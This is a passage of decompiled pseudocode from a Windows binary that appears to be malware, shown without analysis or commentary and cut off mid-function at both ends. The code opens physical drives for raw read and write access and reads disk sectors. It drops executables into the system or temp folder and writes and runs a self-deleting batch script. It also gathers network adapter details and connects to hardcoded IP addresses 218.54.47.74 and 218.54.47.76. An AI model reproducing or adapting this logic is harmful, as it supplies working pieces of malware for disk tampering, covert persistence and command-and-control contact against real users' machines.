        psVar1 = (short *)((int)&DAT_00418890 + iVar3);
        *(short *)((int)&DAT_0041c018 + iVar3) = *psVar1;
        iVar3 = iVar3 + 2;
      } while (*psVar1 != 0);
      iVar3 = 0;
      do {
        sVar2 = *(short *)((int)asStack_596 + iVar3);
        *(short *)((int)&DAT_0041c120 + iVar3) = sVar2;
        iVar3 = iVar3 + 2;
      } while (sVar2 != 0);
      iVar3 = 0;
      do {
        sVar2 = *(short *)((int)asStack_618 + iVar3);
        *(short *)((int)&DAT_0041c0a0 + iVar3) = sVar2;
        iVar3 = iVar3 + 2;
      } while (sVar2 != 0);
      DAT_0041c098 = local_398;
      DAT_0041c010 = local_2f6;
      DAT_0041c00c = 5;
      FUN_004031f0((uint)(DAT_0041af08 != 3),&local_214);
      _wcscat_s(&local_214,0x104,u_golfset_ini_004189a8);
      DeleteFileW(&local_214);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00402760(wchar_t *param_1,wchar_t param_2)

{
  _wcsrchr(param_1,param_2);
  return;
}



void __cdecl FUN_00402780(wchar_t *param_1,wchar_t *param_2)

{
  _wcsstr(param_1,param_2);
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  char * __cdecl strrchr(char *,int)
//  char * __cdecl strrchr(char * const,int)
// 
// Libraries: Visual Studio 2012 Debug, Visual Studio 2015 Debug, Visual Studio 2017 Debug, Visual
// Studio 2019 Debug

char * __cdecl strrchr(char *_Str,int _Ch)

{
  undefined (*pauVar1) [16];
  
  pauVar1 = _strrchr((undefined (*) [16])_Str,(byte)_Ch);
  return (char *)pauVar1;
}



void __cdecl FUN_004027c0(undefined4 *param_1)

{
  BOOL BVar1;
  _OSVERSIONINFOW local_124;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  *param_1 = 0;
  FUN_00409600(&local_124.dwOSVersionInfoSize,0,0x11c);
  local_124.dwOSVersionInfoSize = 0x11c;
  BVar1 = GetVersionExW(&local_124);
  if (BVar1 != 0) {
    if ((local_124.dwMajorVersion == 5) &&
       ((1 < local_124.dwMinorVersion || (local_124.dwMinorVersion == 1)))) {
      *param_1 = 3;
    }
    if (local_124.dwMajorVersion == 6) {
      if (local_124.dwMinorVersion == 0) {
        *param_1 = 4;
      }
      else if (local_124.dwMinorVersion == 1) {
        *param_1 = 5;
      }
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_004028b0(undefined4 param_1,LPWSTR param_2)

{
  WCHAR local_210;
  uint local_20e [129];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_210 = L'\0';
  FUN_00409600(local_20e,0,0x206);
  if (DAT_0041af08 == 3) {
    GetSystemDirectoryW(&local_210,0x104);
    _wcscat_s(&local_210,0x104,(wchar_t *)&DAT_00418a20);
  }
  else {
    GetTempPathW(0x104,&local_210);
  }
  wsprintfW(param_2,u__s_s_exe_00418a24,&local_210,param_1);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00402960(wchar_t *param_1)

{
  WCHAR local_238;
  uint local_236 [129];
  wchar_t local_30;
  undefined4 local_2e;
  undefined4 local_2a;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_238 = L'\0';
  FUN_00409600(local_236,0,0x206);
  local_30 = L'\0';
  local_2e = 0;
  local_2a = 0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  _wcscpy_s(&local_30,0x14,param_1);
  _wcscat_s(&local_30,0x14,u__exe_00418a38);
  GetModuleFileNameW((HMODULE)0x0,&local_238,0x104);
  FUN_00402780(&local_238,&local_30);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 __cdecl FUN_00402a40(HANDLE param_1,uint *param_2)

{
  short sVar1;
  uint *_Memory;
  uint uVar2;
  int iVar3;
  uint *puVar4;
  short *local_18;
  short *local_14;
  
  if (param_1 != (HANDLE)0xffffffff) {
    _Memory = (uint *)_malloc(0x400);
    FUN_00409600(_Memory,0,0x400);
    uVar2 = FUN_00402d00(param_1);
    iVar3 = FUN_00402e50(param_1,uVar2,2,_Memory);
    if (iVar3 == 0) {
      FID_conflict__free(_Memory);
    }
    else {
      iVar3 = _memcmp(_Memory + 1,&DAT_00418a44,4);
      if (iVar3 == 0) {
        local_14 = (short *)((int)_Memory + 0x10e);
        do {
          sVar1 = *local_14;
          local_14 = local_14 + 1;
        } while (sVar1 != 0);
        if ((int)local_14 - (int)(_Memory + 0x44) >> 1 != 0) {
          puVar4 = _Memory;
          for (iVar3 = 0x8d; iVar3 != 0; iVar3 = iVar3 + -1) {
            *param_2 = *puVar4;
            puVar4 = puVar4 + 1;
            param_2 = param_2 + 1;
          }
          *(undefined2 *)param_2 = *(undefined2 *)puVar4;
          FID_conflict__free(_Memory);
          return 1;
        }
      }
      iVar3 = FUN_00402e50(param_1,0x1e,2,_Memory);
      if (iVar3 == 0) {
        FID_conflict__free(_Memory);
      }
      else {
        iVar3 = _memcmp(_Memory + 1,&DAT_00418a4c,4);
        if (iVar3 == 0) {
          local_18 = (short *)((int)_Memory + 0x10e);
          do {
            sVar1 = *local_18;
            local_18 = local_18 + 1;
          } while (sVar1 != 0);
          if ((int)local_18 - (int)(_Memory + 0x44) >> 1 != 0) {
            puVar4 = _Memory;
            for (iVar3 = 0x8d; iVar3 != 0; iVar3 = iVar3 + -1) {
              *param_2 = *puVar4;
              puVar4 = puVar4 + 1;
              param_2 = param_2 + 1;
            }
            *(undefined2 *)param_2 = *(undefined2 *)puVar4;
            FID_conflict__free(_Memory);
            return 1;
          }
        }
        FID_conflict__free(_Memory);
      }
    }
  }
  return 0;
}



void __cdecl FUN_00402c20(uint *param_1)

{
  HANDLE pvVar1;
  int local_214;
  WCHAR local_210;
  uint local_20e [129];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_214 = 0;
  local_210 = L'\0';
  FUN_00409600(local_20e,0,0x206);
  GetSystemDirectoryW(&local_210,0x104);
  FUN_00402ef0(local_210 + L'﾿',&local_214);
  pvVar1 = (HANDLE)FUN_00403060(local_214);
  if (pvVar1 != (HANDLE)0xffffffff) {
    FUN_00402a40(pvVar1,param_1);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00402d00(HANDLE param_1)

{
  int iVar1;
  uint local_220;
  int local_21c;
  undefined local_208;
  uint local_207 [113];
  int aiStack_42 [14];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  Sleep(100);
  local_220 = 0;
  local_208 = 0;
  FUN_00409600(local_207,0,0x1ff);
  if ((param_1 != (HANDLE)0xffffffff) && (iVar1 = FUN_00402e50(param_1,0,1,&local_208), iVar1 != 0))
  {
    for (local_21c = 0; local_21c < 4; local_21c = local_21c + 1) {
      if (local_220 < (uint)(aiStack_42[local_21c * 4] + aiStack_42[local_21c * 4 + 1])) {
        local_220 = aiStack_42[local_21c * 4] + aiStack_42[local_21c * 4 + 1];
      }
    }
  }
  Sleep(100);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00402e50(HANDLE param_1,uint param_2,int param_3,LPVOID param_4)

{
  longlong lVar1;
  DWORD local_28;
  DWORD local_24;
  _OVERLAPPED local_20;
  DWORD local_c;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_20.Internal = 0;
  local_20.InternalHigh = 0;
  local_20.u.s.Offset = 0;
  local_20.u.s.OffsetHigh = 0;
  local_20.hEvent = (HANDLE)0x0;
  local_c = 0;
  if (param_1 != (HANDLE)0xffffffff) {
    lVar1 = __allmul(param_2,0,0x200,0);
    local_28 = (DWORD)lVar1;
    local_20.u.s.Offset = local_28;
    local_24 = (DWORD)((ulonglong)lVar1 >> 0x20);
    local_20.u.s.OffsetHigh = local_24;
    ReadFile(param_1,param_4,param_3 << 9,&local_c,&local_20);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00402ef0(short param_1,undefined4 *param_2)

{
  HANDLE hDevice;
  BOOL BVar1;
  DWORD local_43c;
  undefined local_438 [8];
  undefined4 uStack_430;
  uint uStack_428;
  uint uStack_424;
  wchar_t local_38;
  undefined4 local_36;
  undefined4 local_32;
  undefined4 local_2e;
  undefined4 local_2a;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined2 local_12;
  undefined4 local_10;
  undefined2 local_c;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_c = DAT_00418a58;
  local_38 = L'\0';
  local_36 = 0;
  local_32 = 0;
  local_2e = 0;
  local_2a = 0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_10._0_2_ = (short)DAT_00418a54;
  local_10 = CONCAT22((short)((uint)DAT_00418a54 >> 0x10),(short)local_10 + param_1);
  FUN_00405970(&local_38,u______s_00418a5c);
  hDevice = CreateFileW(&local_38,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if ((hDevice != (HANDLE)0xffffffff) &&
     (BVar1 = DeviceIoControl(hDevice,0x560000,(LPVOID)0x0,0,local_438,0x400,&local_43c,
                              (LPOVERLAPPED)0x0), BVar1 != 0)) {
    __alldiv(uStack_428,uStack_424,0x200,0);
    *param_2 = uStack_430;
  }
  if (hDevice != (HANDLE)0x0) {
    CloseHandle(hDevice);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00403060(int param_1)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 local_44 [9];
  undefined4 local_20;
  wchar_t local_1c;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  puVar2 = (undefined4 *)u_____PHYSICALDRIVE_00418a6c;
  puVar3 = local_44;
  for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  local_20 = 0;
  local_1c = L'\0';
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  if (-1 < param_1) {
    FUN_004059a0(param_1,&local_1c,10);
    _wcscat_s((wchar_t *)local_44,0x14,&local_1c);
    if ((DAT_0041af0c == 0) || (param_1 != 0)) {
      CreateFileW((LPCWSTR)local_44,0xc0000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
    }
    else if (DAT_0041af0c == 1) {
      CreateFileW((LPCWSTR)local_44,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00403140(wchar_t *param_1)

{
  wchar_t local_28;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_28 = L'\0';
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  FUN_004059c0(&local_28,u__d__d__d__d_00418a90);
  _wcscpy_s(param_1,0x10,&local_28);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_004031f0(int param_1,LPWSTR param_2)

{
  if (param_1 == 0) {
    GetSystemDirectoryW(param_2,0x104);
    _wcscat_s(param_2,0x104,(wchar_t *)&DAT_00418aa8);
  }
  else {
    GetTempPathW(0x104,param_2);
  }
  return;
}



void __cdecl FUN_00403240(wchar_t *param_1,wchar_t *param_2,uint param_3)

{
  errno_t eVar1;
  size_t _ElementSize;
  void *_DstBuf;
  FILE *local_c;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_c = (FILE *)0x0;
  eVar1 = __wfopen_s(&local_c,param_1,(wchar_t *)&DAT_00418aac);
  if (eVar1 == 0) {
    _fseek(local_c,0,2);
    _ElementSize = _ftell(local_c);
    _fseek(local_c,0,0);
    _DstBuf = _malloc(_ElementSize + param_3);
    _fread(_DstBuf,_ElementSize,1,local_c);
    _fclose(local_c);
    FUN_00403370((uint *)((int)_DstBuf + _ElementSize),param_3);
    eVar1 = __wfopen_s(&local_c,param_2,(wchar_t *)&DAT_00418ab4);
    if (eVar1 == 0) {
      _fwrite(_DstBuf,_ElementSize + param_3,1,local_c);
      _fclose(local_c);
      if (_DstBuf != (void *)0x0) {
        FID_conflict__free(_DstBuf);
      }
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00403370(uint *param_1,uint param_2)

{
  DWORD DVar1;
  uint uVar2;
  int local_8;
  
  FUN_00409600(param_1,0,param_2);
  DVar1 = GetTickCount();
  FUN_00406fe3(DVar1);
  for (local_8 = 0; local_8 < (int)(param_2 + ((int)param_2 >> 0x1f & 3U)) >> 2;
      local_8 = local_8 + 1) {
    uVar2 = FUN_00406fc0();
    param_1[local_8] = uVar2;
  }
  return;
}



void FUN_004033f0(void)

{
  char cVar1;
  char *pcVar2;
  FILE *_File;
  uint uVar3;
  uint uVar4;
  undefined4 *puVar5;
  undefined4 *local_34c;
  char *local_348;
  char *local_344;
  undefined4 *local_340;
  char *local_33c;
  char *local_338;
  char local_328;
  uint local_327 [64];
  CHAR local_224;
  uint local_223 [64];
  undefined auStack_121 [261];
  undefined4 local_1c [2];
  undefined2 local_14;
  undefined local_12;
  undefined4 local_11;
  undefined4 local_d;
  undefined local_9;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  auStack_121[1] = 0;
  FUN_00409600((uint *)(auStack_121 + 2),0,0x103);
  local_224 = '\0';
  FUN_00409600((uint *)(&local_224 + 1),0,0x103);
  local_328 = '\0';
  FUN_00409600((uint *)(&local_328 + 1),0,0x103);
  local_1c[0] = DAT_00418abc;
  local_1c[1] = DAT_00418ac0;
  local_14 = DAT_00418ac4;
  local_12 = DAT_00418ac6;
  local_11 = 0;
  local_d = 0;
  local_9 = 0;
  GetTempPathA(0x104,auStack_121 + 1);
  local_340 = local_1c;
  do {
    cVar1 = *(char *)local_340;
    local_340 = (undefined4 *)((int)local_340 + 1);
  } while (cVar1 != '\0');
  uVar3 = (int)local_340 - (int)local_1c;
  local_34c = (undefined4 *)auStack_121;
  do {
    pcVar2 = (char *)((int)local_34c + 1);
    local_34c = (undefined4 *)((int)local_34c + 1);
  } while (*pcVar2 != '\0');
  puVar5 = local_1c;
  for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
    *local_34c = *puVar5;
    puVar5 = puVar5 + 1;
    local_34c = local_34c + 1;
  }
  for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
    *(undefined *)local_34c = *(undefined *)puVar5;
    puVar5 = (undefined4 *)((int)puVar5 + 1);
    local_34c = (undefined4 *)((int)local_34c + 1);
  }
  GetModuleFileNameA((HMODULE)0x0,&local_224,0x104);
  _strcpy_s(&local_328,0x104,&local_224);
  pcVar2 = strrchr(&local_328,0x5c);
  if (pcVar2 != (char *)0x0) {
    *pcVar2 = '\0';
  }
  _File = _fopen(auStack_121 + 1,&DAT_00418ac8);
  if (_File != (FILE *)0x0) {
    _fwrite(s__Repeat_00418acc,9,1,_File);
    _fwrite(s_del___00418ad8,5,1,_File);
    local_338 = &local_224;
    do {
      cVar1 = *local_338;
      local_338 = local_338 + 1;
    } while (cVar1 != '\0');
    _fwrite(&local_224,(int)local_338 - (int)(&local_224 + 1),1,_File);
    _fwrite(&DAT_00418ae0,2,1,_File);
    _fwrite(s_if_exist___00418ae4,10,1,_File);
    local_33c = &local_224;
    do {
      cVar1 = *local_33c;
      local_33c = local_33c + 1;
    } while (cVar1 != '\0');
    _fwrite(&local_224,(int)local_33c - (int)(&local_224 + 1),1,_File);
    _fwrite(s___goto_Repeat_00418af0,0xf,1,_File);
    _fwrite(s_rmdir___00418b00,7,1,_File);
    local_348 = &local_328;
    do {
      cVar1 = *local_348;
      local_348 = local_348 + 1;
    } while (cVar1 != '\0');
    _fwrite(&local_328,(int)local_348 - (int)(&local_328 + 1),1,_File);
    _fwrite(&DAT_00418b08,3,1,_File);
    _fwrite(s_del___00418b0c,5,1,_File);
    local_344 = auStack_121 + 1;
    do {
      cVar1 = *local_344;
      local_344 = local_344 + 1;
    } while (cVar1 != '\0');
    _fwrite(auStack_121 + 1,(int)local_344 - (int)(auStack_121 + 2),1,_File);
    _fwrite(&DAT_00418b14,1,1,_File);
    if (_File != (FILE *)0x0) {
      _fclose(_File);
    }
    ShellExecuteA((HWND)0x0,&DAT_00418b18,auStack_121 + 1,(LPCSTR)0x0,(LPCSTR)0x0,0);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00403890(wchar_t *param_1)

{
  wchar_t wVar1;
  undefined2 *puVar2;
  wchar_t *local_220;
  wchar_t *local_21c;
  WCHAR local_210;
  uint local_20e [129];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_210 = L'\0';
  FUN_00409600(local_20e,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,&local_210,0x104);
  puVar2 = (undefined2 *)FUN_00402760(&local_210,L'\\');
  *puVar2 = 0;
  local_220 = puVar2 + 1;
  puVar2 = (undefined2 *)FUN_00402760(local_220,L'.');
  *puVar2 = 0;
  local_21c = param_1;
  do {
    wVar1 = *local_220;
    *local_21c = wVar1;
    local_220 = local_220 + 1;
    local_21c = local_21c + 1;
  } while (wVar1 != L'\0');
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004039d0(void)

{
  short sVar1;
  short *local_24;
  short *local_20;
  short *local_1c;
  short *local_18;
  short *local_14;
  short *local_10;
  
  _DAT_0041cd28 = DAT_0041cce8;
  DAT_0041ce20 = FUN_00403af0((wchar_t *)&DAT_0041cbc6);
  DAT_0041ce24 = DAT_0041cc46;
  DAT_0041ce26 = FUN_00403af0((wchar_t *)&DAT_0041cb24);
  DAT_0041ce2a = (uint)DAT_0041cba4;
  local_1c = &DAT_0041cba6;
  local_10 = &DAT_0041ce2e;
  do {
    sVar1 = *local_1c;
    *local_10 = sVar1;
    local_1c = local_1c + 1;
    local_10 = local_10 + 1;
  } while (sVar1 != 0);
  local_20 = &DAT_0041ccc8;
  local_14 = &DAT_0041ce4e;
  do {
    sVar1 = *local_20;
    *local_14 = sVar1;
    local_20 = local_20 + 1;
    local_14 = local_14 + 1;
  } while (sVar1 != 0);
  local_24 = &DAT_0041cca8;
  local_18 = &DAT_0041ce6e;
  do {
    sVar1 = *local_24;
    *local_18 = sVar1;
    local_24 = local_24 + 1;
    local_18 = local_18 + 1;
  } while (sVar1 != 0);
  return;
}



void __cdecl FUN_00403af0(wchar_t *param_1)

{
  undefined4 *puVar1;
  wchar_t *pwVar2;
  int iVar3;
  int local_20;
  wchar_t *local_1c;
  wchar_t *local_18 [4];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_18[0] = (wchar_t *)0x0;
  local_18[1] = (wchar_t *)0x0;
  local_18[2] = (wchar_t *)0x0;
  local_18[3] = (wchar_t *)0x0;
  for (local_20 = 0; local_20 < 4; local_20 = local_20 + 1) {
    pwVar2 = (wchar_t *)operator_new(0x20);
    local_18[local_20] = pwVar2;
    puVar1 = (undefined4 *)local_18[local_20];
    *puVar1 = 0;
    puVar1[1] = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    puVar1[5] = 0;
    puVar1[6] = 0;
    puVar1[7] = 0;
  }
  iVar3 = FUN_00403c70(param_1,(wchar_t *)&DAT_00418b20,(int)local_18,0xf);
  if (iVar3 == 4) {
    __wcstoi64(local_18[0],&local_1c,10);
    __wcstoi64(local_18[1],&local_1c,10);
    __wcstoi64(local_18[2],&local_1c,10);
    __wcstoi64(local_18[3],&local_1c,10);
    for (local_20 = 0; local_20 < 4; local_20 = local_20 + 1) {
      if (local_18[local_20] != (wchar_t *)0x0) {
        FID_conflict__free(local_18[local_20]);
      }
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



int __cdecl FUN_00403c70(wchar_t *param_1,wchar_t *param_2,int param_3,rsize_t param_4)

{
  wchar_t wVar1;
  int iVar2;
  size_t local_18;
  wchar_t *local_14;
  wchar_t *local_10;
  int local_c;
  
  local_c = 0;
  local_14 = param_1;
  do {
    wVar1 = *local_14;
    local_14 = local_14 + 1;
  } while (wVar1 != L'\0');
  if ((int)local_14 - (int)(param_1 + 1) >> 1 == 0) {
    local_c = 0;
  }
  else {
    local_10 = param_1;
    while (iVar2 = FUN_00402780(local_10,param_2), iVar2 != 0) {
      local_18 = iVar2 - (int)local_10 >> 1;
      if ((int)param_4 < (int)local_18) {
        local_18 = param_4;
      }
      _wcsncpy(*(wchar_t **)(param_3 + local_c * 4),local_10,local_18);
      *(undefined2 *)(*(int *)(param_3 + local_c * 4) + local_18 * 2) = 0;
      local_10 = (wchar_t *)(iVar2 + 2);
      local_c = local_c + 1;
    }
    _wcscpy_s(*(wchar_t **)(param_3 + local_c * 4),param_4,local_10);
    local_c = local_c + 1;
  }
  return local_c;
}



void __cdecl FUN_00403d80(undefined4 *param_1,undefined *param_2)

{
  HANDLE pvVar1;
  int iVar2;
  DWORD DVar3;
  SIZE_T dwBytes;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  uint local_20;
  LPVOID local_14;
  LPVOID local_10;
  SIZE_T local_c;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  uVar6 = 0;
  uVar5 = 0;
  uVar4 = 0;
  local_20 = 0;
  local_c = 15000;
  do {
    DVar3 = 0;
    dwBytes = local_c;
    pvVar1 = GetProcessHeap();
    local_14 = HeapAlloc(pvVar1,DVar3,dwBytes);
    if (local_14 == (LPVOID)0x0) goto LAB_00403f38;
    iVar2 = GetAdaptersAddresses(2,0x10,0,local_14,&local_c,uVar4,uVar5,uVar6);
    if (iVar2 == 0x6f) {
      DVar3 = 0;
      pvVar1 = GetProcessHeap();
      HeapFree(pvVar1,DVar3,local_14);
      local_14 = (LPVOID)0x0;
    }
    local_20 = local_20 + 1;
  } while ((iVar2 == 0x6f) && (local_20 < 3));
  if (iVar2 == 0) {
    for (local_10 = local_14; local_10 != (LPVOID)0x0; local_10 = *(LPVOID *)((int)local_10 + 8)) {
      if ((*(int *)((int)local_10 + 0x34) == 6) && (*(int *)((int)local_10 + 0x1c) != 0)) {
        *param_1 = *(undefined4 *)((int)local_10 + 0x2c);
        *(undefined2 *)(param_1 + 1) = *(undefined2 *)((int)local_10 + 0x30);
        param_2[3] = *(undefined *)(*(int *)(*(int *)((int)local_10 + 0x10) + 0xc) + 4);
        param_2[2] = *(undefined *)(*(int *)(*(int *)((int)local_10 + 0x10) + 0xc) + 5);
        param_2[1] = *(undefined *)(*(int *)(*(int *)((int)local_10 + 0x10) + 0xc) + 6);
        *param_2 = *(undefined *)(*(int *)(*(int *)((int)local_10 + 0x10) + 0xc) + 7);
        break;
      }
    }
  }
LAB_00403f38:
  if (local_14 != (LPVOID)0x0) {
    DVar3 = 0;
    pvVar1 = GetProcessHeap();
    HeapFree(pvVar1,DVar3,local_14);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00403f70(uint *param_1)

{
  void *_Memory;
  int iVar1;
  LPCSTR *ppCVar2;
  undefined4 uVar3;
  undefined4 local_c;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  _Memory = operator_new(0x20);
  uVar3 = 0;
  FUN_00409600(param_1,0,0xa0);
  iVar1 = FUN_00403d80((undefined4 *)((int)param_1 + 0x4a),(undefined *)(param_1 + 0x14));
  if (iVar1 == 0) {
    local_c = Ordinal_8(param_1[0x14],uVar3);
    ppCVar2 = (LPCSTR *)Ordinal_51(&local_c,4,2);
    if ((ppCVar2 != (LPCSTR *)0x0) &&
       (FUN_00404070(*ppCVar2,(LPWSTR)(param_1 + 0x16),0x20), _Memory != (void *)0x0)) {
      FID_conflict__free(_Memory);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



LPWSTR __cdecl FUN_00404070(LPCSTR param_1,LPWSTR param_2,int param_3)

{
  char cVar1;
  int local_10;
  char *local_c;
  
  local_c = param_1;
  do {
    cVar1 = *local_c;
    local_c = local_c + 1;
  } while (cVar1 != '\0');
  local_10 = (int)local_c - (int)(param_1 + 1);
  if (param_2 == (LPWSTR)0x0) {
    param_3 = MultiByteToWideChar(0,0,param_1,-1,(LPWSTR)0x0,0);
    param_2 = (LPWSTR)_malloc(param_3 << 1);
  }
  if (local_10 == 0) {
    *param_2 = L'\0';
  }
  else {
    if ((0 < param_3) && (param_3 + -1 < local_10)) {
      local_10 = param_3 + -1;
    }
    MultiByteToWideChar(0,0,param_1,-1,param_2,local_10 + 1);
  }
  return param_2;
}



void __cdecl FUN_00404140(undefined4 param_1,char *param_2)

{
  char local_18;
  undefined4 local_17;
  undefined4 local_13;
  undefined4 local_f;
  undefined2 local_b;
  undefined local_9;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_18 = '\0';
  local_17 = 0;
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_9 = 0;
  FUN_004059f0(&local_18,s__d__d__d__d_00418b24);
  _strcpy_s(param_2,0x10,&local_18);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_004041f0(void)

{
  int iVar1;
  int local_1c;
  char local_18;
  undefined4 local_17;
  undefined4 local_13;
  undefined4 local_f;
  undefined2 local_b;
  undefined local_9;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_18 = '\0';
  local_17 = 0;
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_9 = 0;
  iVar1 = FUN_004042f0(s_218_54_47_74_00418b30,DAT_0041aef4);
  if (iVar1 != 0) {
    if (DAT_0041af08 == 3) {
      local_1c = FUN_004042f0(s_218_54_47_76_00418b40,0x2bac);
    }
    else {
      local_1c = FUN_004042f0(s_218_54_47_76_00418b50,0x2ba2);
    }
    if (((local_1c != 0) && (iVar1 == 1)) && (local_1c == 1)) {
      if (DAT_0041ce26 != 0) {
        FUN_00404140(DAT_0041ce26,&local_18);
      }
      FUN_004042f0(&local_18,DAT_0041aef4);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_004042f0(undefined4 param_1,undefined2 param_2)

{
  int iVar1;
  int local_424;
  int local_420;
  wchar_t local_418;
  uint local_416 [129];
  WCHAR local_210;
  uint local_20e [129];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  iVar1 = FUN_004044d0(param_1,param_2);
  if (iVar1 == 0) {
    local_210 = L'\0';
    FUN_00409600(local_20e,0,0x206);
    local_418 = L'\0';
    FUN_00409600(local_416,0,0x206);
    GetTempPathW(0x104,&local_210);
    for (local_424 = 0; local_424 < 5; local_424 = local_424 + 1) {
      if ((&DAT_0041c3a8)[local_424 * 0x8c] != 0) {
        _wcscpy_s(&local_418,0x104,&local_210);
        _wcscat_s(&local_418,0x104,&DAT_0041c3a8 + local_424 * 0x8c);
      }
    }
    for (local_420 = 0; local_420 < 5; local_420 = local_420 + 1) {
      if ((&DAT_0041c3a8)[local_420 * 0x8c] != 0) {
        FUN_00405480(&DAT_0041c3a8 + local_420 * 0x8c,param_1,param_2,1);
      }
    }
    _wcscat_s(&local_210,0x104,&DAT_0041c1a0);
    GetFileAttributesW(&local_210);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_004044d0(undefined4 param_1,undefined2 param_2)

{
  uint *_Memory;
  int iVar1;
  wchar_t *_Src;
  undefined4 *puVar2;
  undefined4 *puVar3;
  ushort local_c1c;
  ushort local_c18;
  size_t local_c14;
  int local_c10;
  short local_c0c [2];
  undefined4 local_c08 [256];
  undefined2 local_808;
  uint local_806 [511];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  puVar2 = &DAT_0041c920;
  puVar3 = local_c08;
  for (iVar1 = 0x80; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
